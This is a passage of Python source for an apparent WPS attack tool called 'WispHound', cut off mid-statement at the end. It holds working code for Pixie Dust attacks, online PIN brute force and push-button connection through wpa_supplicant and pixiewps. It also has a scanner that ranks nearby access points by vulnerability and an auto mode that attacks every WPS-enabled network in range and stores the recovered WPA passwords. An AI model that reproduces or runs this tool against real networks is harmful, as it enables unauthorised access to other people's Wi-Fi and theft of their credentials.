            elif 'Network Key' in line and 'hexdump' in line:
                self.connection_status.status = 'GOT_PSK'
                self.connection_status.wpa_psk = bytes.fromhex(
                    get_hex(line)).decode('utf-8', errors='replace')
        elif ': State: ' in line:
            if '-> SCANNING' in line:
                self.connection_status.status = 'scanning'
                self.__print_with_indicators('*', 'Scanning…')
        elif 'WPS-FAIL' in line and self.connection_status.status != '':
            self.connection_status.status = 'WPS_FAIL'
            print('[-] wpa_supplicant returned WPS-FAIL')
        elif 'Trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            if 'SSID' in line:
                self.connection_status.essid = self._extract_essid(line)
            self.__print_with_indicators('*', 'Authenticating…')
        elif 'Authentication response' in line:
            self.__print_with_indicators('*', 'Authenticated')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line:
                self.connection_status.essid = self._extract_essid(line)
            self.__print_with_indicators('*', 'Associating with AP…')
        elif 'Associated with' in line and self.interface in line:
            b = line.split()[-1].upper()
            if self.connection_status.essid:
                self.__print_with_indicators(
                    '+', f'Associated with {b} '
                         f'(ESSID: {self.connection_status.essid})')
            else:
                self.__print_with_indicators('+', f'Associated with {b}')
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            self.__print_with_indicators('*', 'Sending EAPOL Start…')
        elif 'EAP entering state IDENTITY' in line:
            self.__print_with_indicators('*', 'Received Identity Request')
        elif 'using real identity' in line:
            self.__print_with_indicators('*', 'Sending Identity Response…')
        elif bssid and bssid in line.lower() and 'level=' in line:
            self.lastPwr = line.split('level=')[1].split(' ')[0]
            if 'noise=' in line:
                noise = line.split('noise=')[1].split(' ')[0]
                print(f'[i] Current signal: {self.lastPwr}, noise: {noise}')
            else:
                print(f'[i] Current signal: {self.lastPwr}')
        elif pbc_mode and ('selected BSS ' in line):
            b = line.split('selected BSS ')[-1].split()[0].upper()
            self.connection_status.bssid = b
            print(f'[*] Selected AP: {b}')

        return True

    @staticmethod
    def _extract_essid(line):
        try:
            raw = "'".join(line.split("'")[1:-1])
            return (codecs.decode(raw, 'unicode-escape')
                    .encode('latin1').decode('utf-8', errors='replace'))
        except Exception:
            return ''

    def __runPixiewps(self, showcmd=False, full_range=False, _retry=True):
        self.__print_with_indicators('*', 'Running Pixiewps…')
        self.__print_with_indicators(
            'P', self.pixie_creds.status_line())
        try:
            argv = self.pixie_creds.get_pixie_args(
                full_range, timeout=self.pixiewps_timeout)
        except ValueError as e:
            print(f'[!] Pixiewps data validation failed: {e}')
            return False

        if showcmd:
            print(' '.join(argv))
        self._emit_json('pixiewps_start', argv=argv, full_range=full_range)

        try:
            r = subprocess.run(
                argv, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                encoding='utf-8', errors='replace',
                timeout=self.pixiewps_timeout)
        except subprocess.TimeoutExpired:
            print(f'[!] pixiewps timed out after {self.pixiewps_timeout}s')
            self._emit_json('pixiewps_timeout',
                            timeout=self.pixiewps_timeout)
            return False
        except FileNotFoundError:
            print('[!] pixiewps binary not found in PATH')
            return False

        out = r.stdout or ''
        print(out)
        self._emit_json('pixiewps_output', rc=r.returncode, out=out)

        m = re.search(r"\[\+\]\s*WPS pin:\s*'?([^'\n\r]*)'?", out)
        if m:
            pin = m.group(1).strip()
            if pin == '<empty>':
                self._emit_json('pixiewps_result', pin='')
                return ''
            if pin.isdigit() and len(pin) == 8:
                self._emit_json('pixiewps_result', pin=pin)
                return pin
            if pin.isdigit() and len(pin) == 7:
                full = pin + str(self.generator.checksum(int(pin)))
                self._emit_json('pixiewps_result', pin=full)
                return full

        if _retry and not full_range and (
                'force' in out.lower() or 'full range' in out.lower()):
            print('[i] Retrying with --force (full range)…')
            return self.__runPixiewps(showcmd, full_range=True, _retry=False)

        return False

    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
        print(f"[+] WPS PIN: '{wps_pin}'")
        print(f"[+] WPA PSK: '{wpa_psk}'")
        print(f"[+] AP SSID: '{essid}'")
        self._emit_json('credentials', wps_pin=wps_pin,
                        wpa_psk=wpa_psk, essid=essid)

    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
        os.makedirs(self.reports_dir, exist_ok=True)
        filename = os.path.join(self.reports_dir, 'stored')
        dateStr = datetime.now().strftime('%d.%m.%Y %H:%M')
        with open(filename + '.txt', 'a', encoding='utf-8') as f:
            f.write(f'{dateStr}\nBSSID: {bssid}\nESSID: {essid}\n'
                    f'WPS PIN: {wps_pin}\nWPA PSK: {wpa_psk}\n\n')
        header = not os.path.isfile(filename + '.csv')
        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as f:
            w = csv.writer(f, delimiter=';', quoting=csv.QUOTE_ALL)
            if header:
                w.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
            w.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
        print(f'[i] Credentials saved to {filename}.txt, {filename}.csv')
        self.db.save_credentials(bssid, essid, wps_pin, wpa_psk)
        self._emit_json('credentials_saved', bssid=bssid,
                        essid=essid, wps_pin=wps_pin, wpa_psk=wpa_psk)

    def __savePin(self, bssid, pin):
        filename = os.path.join(
            self.pixiewps_dir, f'{bssid.replace(":", "").upper()}.run')
        with open(filename, 'w') as f:
            f.write(pin)
        print(f'[i] PIN saved in {filename}')
        self._emit_json('pin_saved', bssid=bssid, pin=pin, path=filename)

    def __prompt_wpspin(self, bssid):
        pins = self.generator.getSuggestedUnique(bssid)
        if len(pins) > 1:
            print(f'PINs generated for {bssid} (deduplicated):')
            print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
            for i, pin in enumerate(pins):
                print('{:<3} {:<10} {:<}'.format(
                    f'{i + 1})', pin['pin'], pin['name']))
            while True:
                pinNo = input('Select the PIN: ')
                try:
                    idx = int(pinNo)
                    if 1 <= idx <= len(pins):
                        return pins[idx - 1]['pin']
                    raise IndexError
                except (ValueError, IndexError):
                    print('Invalid number')
        elif len(pins) == 1:
            print('[i] The only probable PIN is selected:', pins[0]['name'])
            return pins[0]['pin']
        return None

    def __wps_connection(self, bssid=None, pin=None, pixiemode=False,
                         pbc_mode=False, verbose=None, max_retries=3):
        if verbose is None:
            verbose = self.print_debug
        self.pixie_creds.clear()
        self.connection_status.clear()
        try:
            self.wpas.stdout.read(300)
        except Exception:
            pass

        if pbc_mode:
            if bssid:
                print(f'[*] Starting WPS push button connection to {bssid}…')
                cmd = f'WPS_PBC {bssid}'
            else:
                print('[*] Starting WPS push button connection…')
                cmd = 'WPS_PBC'
        else:
            print(f"[*] Trying PIN '{pin}'…")
            cmd = f'WPS_REG {bssid} {pin}'

        for attempt in range(1, max_retries + 1):
            r = self.sendAndReceive(cmd)
            if 'OK' not in r:
                self.connection_status.status = 'WPS_FAIL'
                print(self._explain_wpas_not_ok_status(cmd, r))
                if attempt < max_retries:
                    back = 2 ** attempt
                    print(f'[!] Backing off {back}s '
                          f'(retry {attempt}/{max_retries})')
                    time.sleep(back)
                    continue
                return False

            while True:
                if not self.__handle_wpas(
                        pixiemode=pixiemode, pbc_mode=pbc_mode,
                        verbose=verbose, bssid=(bssid or '').lower()):
                    break
                if self.connection_status.status in (
                        'WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
                    break

            self.sendOnly('WPS_CANCEL')

            if self.connection_status.status == 'GOT_PSK':
                return True

            if self.connection_status.status == 'WPS_FAIL' \
                    and attempt < max_retries:
                back = 2 ** attempt
                print(f'[!] WPS transaction failed; backing off {back}s '
                      f'(retry {attempt}/{max_retries})')
                time.sleep(back)
                continue
            break

        if self.connection_status.nack_count >= 3:
            print('[!] 3+ consecutive NACKs — possible AP lockout risk.')
            if self.cool_down > 0:
                print(f'[i] Cooling down {self.cool_down}s.')
                time.sleep(self.cool_down)
        return False

    def single_connection(self, bssid=None, pin=None, pixiemode=False,
                          pbc_mode=False, showpixiecmd=False,
                          pixieforce=False, store_pin_on_fail=False):
        if not bssid and not pbc_mode:
            print('[!] No BSSID supplied to single_connection()')
            return False

        if not pin and not pbc_mode and bssid:
            known = self.db.known_pin(bssid)
            if known:
                print(f'[i] Known PIN in DB for {bssid}: {known} '
                      f'— trying first.')
                pin = known

        if (not pixiemode and not pbc_mode and not pin and bssid
                and self.target_is_pixie_vuln):
            chipset = self.target_chipset or 'unknown chipset'
            print(f'[!] Target {bssid} looks Pixie Dust vulnerable ({chipset}).')
            if self.auto_mode:
                pixiemode = True
            else:
                ans = input('[?] Try Pixie Dust attack first? [Y/n] ').strip().lower()
                if ans != 'n':
                    pixiemode = True

        if not pin:
            if pixiemode and bssid:
                try:
                    fn = os.path.join(
                        self.pixiewps_dir, f'{bssid.replace(":", "").upper()}.run')
                    with open(fn, 'r') as f:
                        t_pin = f.readline().strip()
                    if self.auto_mode:
                        pin = t_pin
                    elif input(f'[?] Use previously calculated PIN '
                             f'{t_pin}? [n/Y] ').lower() != 'n':
                        pin = t_pin
                    else:
                        raise FileNotFoundError
                except FileNotFoundError:
                    pin = self.generator.getLikely(bssid) or '12345670'
            elif not pbc_mode and bssid:
                if self.auto_mode:
                    pin = self.generator.getLikely(bssid) or '12345670'
                else:
                    pin = self.__prompt_wpspin(bssid) or '12345670'

        if bssid:
            self.db.bump_attempts(bssid)

        if pbc_mode:
            self.__wps_connection(bssid, pbc_mode=True)
            bssid = getattr(self.connection_status, 'bssid', bssid) or bssid
            pin = '<PBC mode>'
        elif store_pin_on_fail:
            try:
                self.__wps_connection(bssid, pin, pixiemode)
            except KeyboardInterrupt:
                print('\nAborting…')
                if bssid:
                    self.__savePin(bssid, pin)
                return False
        else:
            self.__wps_connection(bssid, pin, pixiemode)

        if self.connection_status.status == 'GOT_PSK':
            self.__credentialPrint(
                pin, self.connection_status.wpa_psk,
                self.connection_status.essid)
            if self.save_result and bssid:
                self.__saveResult(bssid, self.connection_status.essid,
                                  pin, self.connection_status.wpa_psk)
            if not pbc_mode and bssid:
                try:
                    os.remove(os.path.join(
                        self.pixiewps_dir, f'{bssid.replace(":", "").upper()}.run'))
                except FileNotFoundError:
                    pass
            return True
        elif pixiemode:
            if self.pixie_creds.got_all():
                pin = self.__runPixiewps(showpixiecmd, pixieforce)
                if pin is not False:
                    return self.single_connection(
                        bssid, pin, pixiemode=False,
                        store_pin_on_fail=True)
                return False
            print(f'[!] Not enough data to run Pixie Dust attack '
                  f'({self.pixie_creds.status_line()})')
            return False
        else:
            if store_pin_on_fail and bssid:
                self.__savePin(bssid, pin)
            return False

    def __first_half_bruteforce(self, bssid, f_half, delay=None,
                                _max_retries=3):
        checksum = self.generator.checksum
        while int(f_half) < 10000:
            t = int(f_half + '000')
            pin = f'{f_half}000{checksum(t)}'
            self.single_connection(bssid, pin)
            if self.connection_status.isFirstHalfValid():
                print('[+] First half found')
                return f_half
            if self.connection_status.status == 'WPS_FAIL':
                print('[!] WPS transaction failed, re-trying last pin')
                _max_retries -= 1
                if _max_retries <= 0:
                    print('[-] Max retries reached for current PIN')
                    return False
                continue
            f_half = str(int(f_half) + 1).zfill(4)
            self.bruteforce.registerAttempt(f_half)
            _max_retries = 3
            if delay:
                time.sleep(delay)
        print('[-] First half not found')
        return False

    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None,
                                 _max_retries=3):
        checksum = self.generator.checksum
        while int(s_half) < 1000:
            t = int(f_half + s_half)
            pin = f'{f_half}{s_half}{checksum(t)}'
            self.single_connection(bssid, pin)
            if self.connection_status.last_m_message > 6:
                return pin
            if self.connection_status.status == 'WPS_FAIL':
                print('[!] WPS transaction failed, re-trying last pin')
                _max_retries -= 1
                if _max_retries <= 0:
                    print('[-] Max retries reached for current PIN')
                    return False
                continue
            s_half = str(int(s_half) + 1).zfill(3)
            self.bruteforce.registerAttempt(f_half + s_half)
            _max_retries = 3
            if delay:
                time.sleep(delay)
        return False

    def smart_bruteforce(self, bssid, start_pin=None, delay=None,
                         loop=False, auto_resume=False):
        if (not start_pin) or (len(start_pin) < 4):
            try:
                fn = os.path.join(
                    self.sessions_dir, f'{bssid.replace(":", "").upper()}.run')
                with open(fn, 'r') as f:
                    if auto_resume or self.auto_mode:
                        mask = f.readline().strip()
                        print(f'[i] Resuming saved session for {bssid} (mask: {mask})')
                    elif input(f'[?] Restore previous session for {bssid}? '
                             f'[n/Y] ').lower() != 'n':
                        mask = f.readline().strip()
                    else:
                        raise FileNotFoundError
            except FileNotFoundError:
                mask = '0000'
        else:
            mask = start_pin[:7]

        try:
            self.bruteforce = BruteforceStatus()
            self.bruteforce.mask = mask
            if len(mask) == 4:
                f_half = self.__first_half_bruteforce(bssid, mask, delay)
                if f_half and self.connection_status.status != 'GOT_PSK':
                    self.__second_half_bruteforce(bssid, f_half, '001', delay)
            elif len(mask) == 7:
                self.__second_half_bruteforce(
                    bssid, mask[:4], mask[4:], delay)
            if self.connection_status.status == 'GOT_PSK':
                print('[+] Brute-force complete — credentials recovered.')
                return
        except KeyboardInterrupt:
            print('\nAborting…')
            fn = os.path.join(
                self.sessions_dir, f'{bssid.replace(":", "").upper()}.run')
            with open(fn, 'w') as f:
                f.write(self.bruteforce.mask)
            print(f'[i] Session saved in {fn}')
            if loop:
                raise

    def __print_with_indicators(self, level, msg):
        print(f'[{level}] [{self.lastPwr}] {msg}')


# ---------------------------------------------------------------------------
# WiFiScanner
# ---------------------------------------------------------------------------
class WiFiScanner:
    def __init__(self, interface, vuln_list=None, reverse_scan=False,
                 db: Optional[TargetDB] = None, min_rssi=None, band=None):
        self.interface = interface
        self.vuln_list = vuln_list or []
        self.reverse_scan = reverse_scan
        self.db = db
        self.min_rssi = min_rssi
        self.band = band
        self.selected_vuln = False
        self.selected_chipset = ''
        self.selected_channel = 0
        self.selected_wps = False

        self.stored = []
        reports = os.path.join(
            os.path.dirname(os.path.realpath(__file__)), 'reports', 'stored.csv')
        try:
            with open(reports, 'r', newline='',
                      encoding='utf-8', errors='replace') as f:
                r = csv.reader(f, delimiter=';', quoting=csv.QUOTE_ALL)
                next(r, None)
                for row in r:
                    if len(row) >= 3:
                        self.stored.append((row[1], row[2]))
        except FileNotFoundError:
            pass

    @staticmethod
    def _classify_pixie_vuln(network):
        haystack = ' '.join([
            network.get('Model', ''),
            network.get('Model number', ''),
            network.get('Device name', ''),
        ]).upper()
        for keyword, label in PIXIE_VULNERABLE_CHIPSETS.items():
            if keyword.upper() in haystack:
                return True, label
        return False, ''

    def iw_scanner(self) -> Optional[Dict[int, dict]]:
        def handle_network(line, result, networks):
            networks.append({
                'Security type': 'Unknown', 'WPS': False,
                'WPS locked': False, 'Model': '',
                'Model number': '', 'Device name': '',
                'Channel': 0, 'Frequency': 0, 'Level': -100,
            })
            networks[-1]['BSSID'] = result.group(1).upper()

        def _decode(d):
            return (codecs.decode(d, 'unicode-escape')
                    .encode('latin1').decode('utf-8', errors='replace'))

        def handle_essid(line, result, networks):
            if not networks:
                return
            networks[-1]['ESSID'] = _decode(result.group(1))

        def handle_level(line, result, networks):
            if not networks:
                return
            networks[-1]['Level'] = int(float(result.group(1)))

        def handle_securityType(line, result, networks):
            if not networks:
                return
            sec = networks[-1]['Security type']
            if result.group(1) == 'capability':
                sec = 'WEP' if 'Privacy' in result.group(2) else 'Open'
            elif sec == 'WEP':
                if result.group(1) == 'RSN':
                    sec = 'WPA2'
                elif result.group(1) == 'WPA':
                    sec = 'WPA'
            elif sec == 'WPA' and result.group(1) == 'RSN':
                sec = 'WPA/WPA2'
            elif sec == 'WPA2' and result.group(1) == 'WPA':
                sec = 'WPA/WPA2'
            networks[-1]['Security type'] = sec

        def handle_wps(line, result, networks):
            if not networks:
                return
            networks[-1]['WPS'] = result.group(1)

        def handle_wpsLocked(line, result, networks):
            if not networks:
                return
            if int(result.group(1), 16):
                networks[-1]['WPS locked'] = True

        def handle_model(line, result, networks):
            if not networks:
                return
            networks[-1]['Model'] = _decode(result.group(1))

        def handle_modelNumber(line, result, networks):
            if not networks:
                return
            networks[-1]['Model number'] = _decode(result.group(1))

        def handle_deviceName(line, result, networks):
            if not networks:
                return
            networks[-1]['Device name'] = _decode(result.group(1))

        def handle_frequency(line, result, networks):
            if not networks:
                return
            freq = int(result.group(1))
            networks[-1]['Frequency'] = freq
            if 2412 <= freq <= 2484:
                networks[-1]['Channel'] = 14 if freq == 2484 else (freq - 2412) // 5 + 1
            elif 5180 <= freq <= 5825:
                networks[-1]['Channel'] = (freq - 5000) // 5
            elif 5955 <= freq <= 7115:
                networks[-1]['Channel'] = (freq - 5950) // 5
            else:
                networks[-1]['Channel'] = 0

        # Plain `iw scan` — no --all (broken on many Kali iw builds).
        argv = ['iw', 'dev', self.interface, 'scan']
        try:
            proc = subprocess.run(argv,
                                  stdout=subprocess.PIPE,
                                  stderr=subprocess.STDOUT,
                                  encoding='utf-8', errors='replace')
        except FileNotFoundError:
            print('[!] iw not found — install wireless-tools / iw')
            return False

        lines = proc.stdout.splitlines()
        networks = []
        matchers = {
            re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
            re.compile(r'SSID: (.*)'): handle_essid,
            re.compile(r'freq: (\d+)'): handle_frequency,
            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
            re.compile(r'(capability): (.+)'): handle_securityType,
            re.compile(r'(RSN):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'(WPA):\t [*] Version: (\d+)'): handle_securityType,
            re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
            re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
            re.compile(r' [*] Model: (.*)'): handle_model,
            re.compile(r' [*] Model Number: (.*)'): handle_modelNumber,
            re.compile(r' [*] Device name: (.*)'): handle_deviceName,
        }

        for line in lines:
            if line.startswith('command failed:'):
                print('[!] Error:', line)
                return False
            line = line.strip('\t')
            for regexp, handler in matchers.items():
                m = re.match(regexp, line)
                if m:
                    handler(line, m, networks)

        # [2.1.2] No WPS filter — every AP is listed.

        if self.min_rssi is not None:
            networks = [n for n in networks
                        if n.get('Level', -100) >= self.min_rssi]
        if self.band:
            if self.band == '2.4':
                networks = [n for n in networks
                            if 2400 <= n.get('Frequency', 0) <= 2500]
            elif self.band == '5':
                networks = [n for n in networks
                            if 5000 <= n.get('Frequency', 0) <= 5900]
            elif self.band == '6':
                networks = [n for n in networks
                            if 5900 <= n.get('Frequency', 0) <= 7200]
        if not networks:
            return False

        for net in networks:
            vuln, chipset = self._classify_pixie_vuln(net)
            net['Pixie vulnerable'] = vuln and bool(net.get('WPS'))
            net['Chipset'] = chipset
            if self.db:
                net['Vendor'] = self.db.vendor_for(net['BSSID'])
                self.db.upsert(net)

        # WPS first, then Pixie-vulnerable, then unlocked, then signal.
        # .get() so a malformed beacon cannot raise KeyError.
        networks.sort(key=lambda x: (
            not x.get('WPS', False),
            not x.get('Pixie vulnerable', False),
            x.get('WPS locked', False),
            -x.get('Level', -100),
        ))
        network_list = {(i + 1): n for i, n in enumerate(networks)}

        def truncateStr(s, length, postfix='…'):
            width = wcwidth.wcswidth(s)
            if width <= length:
                return s + ' ' * (length - width)
            postfix_w = wcwidth.wcswidth(postfix)
            out, cur = [], 0
            for c in s:
                cw = wcwidth.wcswidth(c)
                if cur + cw > length - postfix_w:
                    break
                out.append(c)
                cur += cw
            res = ''.join(out)
            if len(out) < len(s):
                res += postfix
            rw = wcwidth.wcswidth(res)
            return res + ' ' * max(0, length - rw)

        def colored(text, color=None):
            codes = {'green': '\033[92m', 'red': '\033[91m',
                     'yellow': '\033[93m', 'cyan': '\033[96m',
                     'grey': '\033[90m'}
            if color in codes:
                return f'{codes[color]}{text}\033[00m'
            return text

        print('Network marks: {1} {0} {2} {0} {3} {0} {4} {0} {5}'.format(
            '|',
            colored('Possibly vulnerable', 'green'),
            colored('WPS locked', 'red'),
            colored('Already stored', 'yellow'),
            colored('Pixie-vulnerable', 'cyan'),
            colored('No WPS', 'grey')))
        print('Networks list (all bands):')
        print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<4} {:<5} {:<27} {:<}'.format(
            '#', 'BSSID', 'ESSID', 'Sec.', 'PWR', 'Ch', 'WPS',
            'WSC device name', 'WSC model'))

        items = list(network_list.items())
        if self.reverse_scan:
            items = items[::-1]
        for n, net in items:
            model = f"{net['Model']} {net['Model number']}".strip()
            essid = truncateStr(net.get('ESSID', 'HIDDEN'), 25)
            dev = truncateStr(net['Device name'], 27)
            ch = str(net.get('Channel', ''))
            wps_flag = 'yes' if net.get('WPS') else 'no'
            line = ' '.join([
                truncateStr(f'{n})', 4),
                truncateStr(net['BSSID'], 18),
                essid,
                truncateStr(net['Security type'], 8),
                truncateStr(str(net['Level']), 4),
                truncateStr(ch, 4),
                truncateStr(wps_flag, 5),
                dev,
                model,
            ])
            if not net.get('WPS'):
                print(colored(line, 'grey'))
            elif net.get('Pixie vulnerable'):
                print(colored(line, 'cyan'))
            elif (net['BSSID'], net.get('ESSID', 'HIDDEN')) in self.stored:
                print(colored(line, 'yellow'))
            elif net['WPS locked']:
                print(colored(line, 'red'))
            elif self.vuln_list and model in self.vuln_list:
                print(colored(line, 'green'))
            else:
                print(line)

        return network_list

    def prompt_network(self):
        networks = self.iw_scanner()
        if not networks:
            print('[-] No networks found.')
            return None
        while True:
            try:
                choice = input('Select target (press Enter to refresh): ')
                if choice.lower() in ('r', '0', ''):
                    return self.prompt_network()
                idx = int(choice)
                if idx in networks:
                    target = networks[idx]
                    if not target.get('WPS'):
                        print(f"[i] {target['BSSID']} has no WPS IE — "
                              f"it will be shown but cannot be attacked.")
                    self.selected_vuln = target.get('Pixie vulnerable', False)
                    self.selected_chipset = target.get('Chipset', '')
                    self.selected_channel = target.get('Channel', 0)
                    self.selected_wps = bool(target.get('WPS'))
                    return target['BSSID']
                raise IndexError
            except (ValueError, IndexError):
                print('Invalid number')


# ---------------------------------------------------------------------------
# Auto pipeline
# ---------------------------------------------------------------------------
def auto_exploit(interface, args, db):
    scanner = WiFiScanner(
        interface, [], reverse_scan=False, db=db,
        min_rssi=getattr(args, 'min_rssi', None),
        band=getattr(args, 'band', None))
    networks = scanner.iw_scanner()
    if not networks:
        print('[-] No networks.')
        return
    order = sorted(networks.values(),
                   key=lambda n: (not n.get('WPS', False),
                                  not n.get('Pixie vulnerable', False),
                                  n.get('WPS locked', False),
                                  -n.get('Level', -100)))

    backend = getattr(args, 'backend', BACKEND_INTERNAL)
    reports_dir = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'reports')

    if backend in (BACKEND_REAVER, BACKEND_BULLY):
        attacker_cls = ReaverAttacker if backend == BACKEND_REAVER else BullyAttacker
        if not attacker_cls.is_available():
            print(f'[!] {backend} is not installed or not in PATH')
            return

        print(f'[*] Switching {interface} to monitor mode…')
        mon_iface = setup_monitor_mode(interface)
        print(f'[+] Monitor interface: {mon_iface}')

        try:
            attacker = attacker_cls(
                mon_iface, verbose=args.verbose,
                timeout=args.timeout, delay=args.delay,
                json_mode=args.json)

            for net in order:
                if not net.get('WPS'):
                    print(f"[i] Skipping {net['BSSID']} (no WPS)")
                    continue
                if net['WPS locked']:
                    print(f"[i] Skipping {net['BSSID']} (WPS locked)")
                    continue
                if args.pixie_only and not net['Pixie vulnerable']:
                    continue
                print(f"\n=== Attacking {net['BSSID']} "
                      f"({net.get('ESSID', 'HIDDEN')}) "
                      f"[{backend}] ===")
                ch = net.get('Channel', 0)
                try:
                    if net['Pixie vulnerable']:
                        result = attacker.pixie_dust(net['BSSID'], channel=ch)
                        if not result.success:
                            print('[i] Pixie Dust failed — trying PIN attack')
                            likely_pin = WPSpin().getLikely(net['BSSID']) or '12345670'
                            result = attacker.single_pin(
                                net['BSSID'], likely_pin, channel=ch)
                    else:
                        result = attacker.bruteforce(
                            net['BSSID'], channel=ch)
                    _handle_backend_result(
                        result, net['BSSID'], db=db,
                        save_result=args.write, reports_dir=reports_dir,
                        json_mode=args.json)
                except KeyboardInterrupt:
                    print('\n[!] Interrupted.')
                    break
        finally:
            print(f'[*] Restoring {interface} to managed mode…')
            teardown_monitor_mode(mon_iface, interface)
        return

    for net in order:
        if not net.get('WPS'):
            print(f"[i] Skipping {net['BSSID']} (no WPS)")
            continue
        if net['WPS locked']:
            print(f"[i] Skipping {net['BSSID']} (WPS locked)")
            continue
        if args.pixie_only and not net['Pixie vulnerable']:
            continue
        print(f"\n=== Attacking {net['BSSID']} "
              f"({net.get('ESSID', 'HIDDEN')}) ===")
        comp = Companion(interface, save_result=args.write,
                         print_debug=args.verbose, db=db,
                         json_mode=args.json,
                         trace_log=args.trace_log,
                         pixiewps_timeout=args.timeout,
                         cool_down=args.cool,
                         auto_mode=True)
        comp.target_is_pixie_vuln = net['Pixie vulnerable']
        comp.target_chipset = net.get('Chipset', '')
        try:
            if net['Pixie vulnerable']:
                comp.single_connection(net['BSSID'], pixiemode=True,
                                       showpixiecmd=args.show_pixie_cmd,
                                       pixieforce=args.pixie_force,
                                       store_pin_on_fail=True)
            else:
                comp.single_connection(net['BSSID'],
                                       showpixiecmd=args.show_pixie_cmd,
                                       pixieforce=args.pixie_force)
        except KeyboardInterrupt:
            print('\n[!] Interrupted.')
            break
        finally:
            comp.cleanup()


# ---------------------------------------------------------------------------
# Utility
# ---------------------------------------------------------------------------
def ifaceUp(iface, down=False):
    action = 'down' if down else 'up'
    return subprocess.run(['ip', 'link', 'set', iface, action],
                          stdout=subprocess.DEVNULL,
                          stderr=subprocess.DEVNULL).returncode == 0


def die(msg):
    sys.stderr.write(msg + '\n')
    sys.exit(1)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description=f'WispHound {VERSION} — WPS reconnaissance and '
                    'Pixie Dust prioritization',
        epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K')
    parser.add_argument('-V', '--version', action='version',
                        version=f'%(prog)s {VERSION}')
    parser.add_argument('-i', '--interface', required=True,
                        help='Name of the interface to use')
    parser.add_argument('-b', '--bssid', help='BSSID of the target AP')
    parser.add_argument('-p', '--pin',
                        help='Use the specified pin (arbitrary string or 4/8 digit pin)')
    parser.add_argument('-c', '--channel', type=int, default=None,
                        help='Channel of the target AP (useful for reaver/bully)')
    parser.add_argument('-e', '--backend', choices=['internal', 'reaver', 'bully'],
                        default='internal',
                        help='Attack backend engine (default: internal)')
    parser.add_argument('-K', '--pixie-dust', action='store_true',
                        help='Run Pixie Dust attack')
    parser.add_argument('-F', '--pixie-force', action='store_true',
                        help='Run Pixiewps with --force (full range)')
    parser.add_argument('-X', '--show-pixie-cmd', action='store_true',
                        help='Always print Pixiewps command')
    parser.add_argument('-B', '--bruteforce', action='store_true',
                        help='Run online bruteforce attack')
    parser.add_argument('--pbc', '--push-button-connect', action='store_true',
                        help='Run WPS push button connection')
    parser.add_argument('-d', '--delay', type=float,
                        help='Delay between pin attempts')
    parser.add_argument('-w', '--write', action='store_true',
                        help='Write credentials to the file on success')
    parser.add_argument('--iface-down', action='store_true',
                        help='Down network interface when finished')
    parser.add_argument('--vuln-list', type=str,
                        default=os.path.dirname(os.path.realpath(__file__))
                        + '/vulnwsc.txt',
                        help='Custom file with vulnerable devices list')
    parser.add_argument('-l', '--loop', action='store_true',
                        help='Run in a loop')
    parser.add_argument('-r', '--reverse-scan', action='store_true',
                        help='Reverse order of networks in scan list')
    parser.add_argument('--mtk-wifi', action='store_true',
                        help='Activate MediaTek Wi-Fi driver on startup')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Verbose output')
    parser.add_argument('-A', '--auto', action='store_true',
                        help='Scan → rank → attack each Pixie-vulnerable target')
    parser.add_argument('--pixie-only', action='store_true',
                        help='In --auto, only attack Pixie-vulnerable targets')
    parser.add_argument('-J', '--json', action='store_true',
                        help='Emit JSON lines for credentials / scan events')
    parser.add_argument('--db', type=str,
                        default=os.path.expanduser('~/.WispHound/targets.db'),
                        help='SQLite target database')
    parser.add_argument('--trace-log', type=str, default=None,
                        help='Tee raw wpa_supplicant output to a file')
    parser.add_argument('--oui', type=str, default=None,
                        help='Additional OUI vendor file')
    parser.add_argument('--timeout', type=int, default=120,
                        help='pixiewps timeout in seconds (default 120)')
    parser.add_argument('--cool', type=int, default=60,
                        help='Cool-down seconds after 3 NACKs (default 60)')
    parser.add_argument('--no-lockout-check', action='store_true',
                        help='Skip lockout safety (not recommended)')
    parser.add_argument('--min-rssi', type=int, default=None,
                        help='Filter out APs weaker than this signal level in dBm')
    parser.add_argument('--band', choices=['2.4', '5', '6'], default=None,
                        help='Filter scan by Wi-Fi band (2.4, 5, or 6 GHz)')
    parser.add_argument('--resume', action='store_true',
                        help='Automatically resume saved brute-force session')

    args = parser.parse_args()

    if sys.hexversion < 0x03060F0:
        die('The program requires Python 3.6 and above')
    if os.getuid() != 0:
        die('Run it as root')

    if args.mtk_wifi:
        dev = Path('/dev/wmtWifi')
        if not dev.is_char_device():
            die('Unable to activate MediaTek Wi-Fi device (--mtk-wifi): '
                '/dev/wmtWifi does not exist or is not a character device')
        dev.chmod(0o644)
        dev.write_text('1')

    if not ifaceUp(args.interface):
        die(f'Unable to up interface "{args.interface}"')

    if args.no_lockout_check:
        args.cool = 0

    db = TargetDB(args.db)
    if args.oui:
        try:
            db.load_oui_file(args.oui)
        except FileNotFoundError:
            print(f'[!] OUI file not found: {args.oui}')

    try:
        if args.auto:
            auto_exploit(args.interface, args, db)
            sys.exit(0)

        while True:
            try:
                selected_vuln = False
                selected_chipset = ''
                selected_channel = args.channel
                selected_wps = True

                if args.pbc:
                    reports_dir = os.path.join(
                        os.path.dirname(os.path.realpath(__file__)), 'reports')
                    if args.backend == 'internal':
                        comp = Companion(
                            args.interface, args.write,
